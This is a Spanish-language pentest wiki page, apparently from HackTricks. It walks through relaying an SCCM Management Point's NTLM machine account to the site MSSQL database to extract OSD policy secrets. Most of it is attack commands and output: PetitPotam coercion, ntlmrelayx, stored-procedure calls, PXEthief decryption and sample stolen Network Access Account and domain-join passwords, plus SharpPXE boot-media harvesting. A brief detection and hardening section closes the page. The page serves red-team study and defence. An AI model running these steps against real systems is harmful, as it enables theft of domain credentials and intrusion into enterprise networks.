# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Al forzar a un **System Center Configuration Manager (SCCM) Management Point (MP)** a autenticarse mediante SMB/RPC y **relaying** esa cuenta de máquina NTLM a la **site database (MSSQL)**, obtienes derechos `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Estos roles permiten llamar a un conjunto de stored procedures que exponen blobs de políticas de **Operating System Deployment (OSD)** (credenciales de Network Access Account, variables de Task-Sequence, etc.). Los blobs están codificados/encriptados en hexadecimal, pero pueden decodificarse y desencriptarse con **PXEthief**, obteniendo secretos en texto plano.

Cadena de alto nivel:
1. Descubrir el MP y la site DB ↦ endpoint HTTP no autenticado `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Iniciar `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Forzar la autenticación del MP usando **PetitPotam**, PrinterBug, DFSCoerce, etc.
4. A través del proxy SOCKS, conectarse con `mssqlclient.py -windows-auth` como la cuenta **<DOMAIN>\\<MP-host>$** cuyo NTLM fue relayed.
5. Ejecutar:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (o `MP_GetPolicyBodyAfterAuthorization`)
6. Eliminar la BOM `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Secretos como `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password`, etc., se recuperan sin interactuar con PXE ni con los clientes.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
La extensión ISAPI **GetAuth.dll** del MP expone varios parámetros que no requieren autenticación (a menos que el sitio sea exclusivamente PKI):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Devuelve la clave pública del certificado de firma del sitio + los GUID de los dispositivos *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Enumera todos los Management-Point del sitio. |
| `SITESIGNCERT` | Devuelve el certificado de firma del Primary-Site (identifica el site server sin LDAP). |

Obtén los GUID que actuarán como **clientID** para las consultas posteriores a la DB:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Retransmitir la cuenta de máquina del MP a MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Cuando se active la coerción, deberías ver algo como:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identificar las políticas OSD mediante procedimientos almacenados
Conéctate a través del proxy SOCKS (puerto 1080 de forma predeterminada):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Cambia a la base de datos **CM_<SiteCode>** (usa el código de sitio de 3 dígitos, p. ej., `CM_001`).

### 3.1  Buscar GUIDs de Unknown-Computer (opcional)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Enumerar las políticas asignadas
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Cada fila contiene `PolicyAssignmentID`, `Body` (hex), `PolicyID` y `PolicyVersion`.

Céntrate en las políticas:
* **NAAConfig** – credenciales de Network Access Account
* **TS_Sequence** – variables de Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – puede contener cuentas de ejecución

### 3.3  Recuperar el cuerpo completo
Si ya tienes `PolicyID` y `PolicyVersion`, puedes omitir el requisito de clientID usando:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> IMPORTANTE: En SSMS, aumenta “Maximum Characters Retrieved” (>65535) o el blob se truncará.

---

## 4. Decodificar y descifrar el blob
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Ejemplo de secretos recuperados:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Roles y procedimientos SQL relevantes
Al realizar el relay, el inicio de sesión se asigna a:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Estos roles exponen docenas de permisos EXEC; los principales utilizados en este ataque son:

| Stored Procedure | Propósito |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Enumerar las políticas aplicadas a un `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Devolver el cuerpo completo de la política. |
| `MP_GetListOfMPsInSiteOSD` | Devuelto por la ruta `MPKEYINFORMATIONMEDIA`. |

Puedes inspeccionar la lista completa con:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Recolección de medios de arranque PXE (SharpPXE)
* **Respuesta PXE mediante UDP/4011**: envía una solicitud de arranque PXE a un Distribution Point configurado para PXE. La respuesta de proxyDHCP revela rutas de arranque como `SMSBoot\\x64\\pxe\\variables.dat` (configuración cifrada) y `SMSBoot\\x64\\pxe\\boot.bcd`, además de un blob de claves cifrado opcional.<sup>[[4]](#references)</sup>
* **Obtener artefactos de arranque mediante TFTP**: utiliza las rutas devueltas para descargar `variables.dat` mediante TFTP (sin autenticación). El archivo es pequeño (unos pocos KB) y contiene las variables cifradas del medio.
* **Descifrar o crackear**:
- Si la respuesta incluye la clave de descifrado, pásala a **SharpPXE** para descifrar `variables.dat` directamente.
- Si no se proporciona ninguna clave (medio PXE protegido mediante una contraseña personalizada), SharpPXE genera un hash compatible con **Hashcat** con el formato `$sccm$aes128$...` para crackearlo offline. Después de recuperar la contraseña, descifra el archivo.
* **Analizar el XML descifrado**: las variables en texto plano contienen metadatos de despliegue de SCCM (**URL del Management Point**, **Site Code**, GUID de medios y otros identificadores). SharpPXE los analiza e imprime un comando de **SharpSCCM** listo para ejecutar, con los parámetros GUID/PFX/site rellenados para el abuso posterior.
* **Requisitos**: solo se necesita conectividad de red con el listener PXE (UDP/4011) y TFTP; no se requieren privilegios de administrador local.

---

## 7. Detección y Hardening
1. **Monitorizar los logins del MP**: cualquier cuenta de equipo del MP que inicie sesión desde una IP que no corresponda a su host ≈ relay.<sup>[[1]](#references)</sup>
2. Habilitar **Extended Protection for Authentication (EPA)** en la base de datos del sitio (`PREVENT-14`).
3. Deshabilitar NTLM no utilizado, exigir la firma SMB y restringir RPC (las mismas mitigaciones utilizadas contra `PetitPotam`/`PrinterBug`).
4. Aplicar Hardening a la comunicación MP ↔ DB mediante IPSec / mutual-TLS.
5. **Restringir la exposición de PXE**: filtrar UDP/4011 y TFTP mediante el firewall para permitirlos solo en VLAN de confianza, exigir contraseñas PXE y generar alertas ante descargas TFTP de `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Véase también
* Fundamentos de NTLM relay:

{{#ref}}
../ntlm/README.md
{{#endref}}

* Abuso de MSSQL y post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Referencias
- [1] [I’d Like to Speak to Your Manager: Stealing Secrets with Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
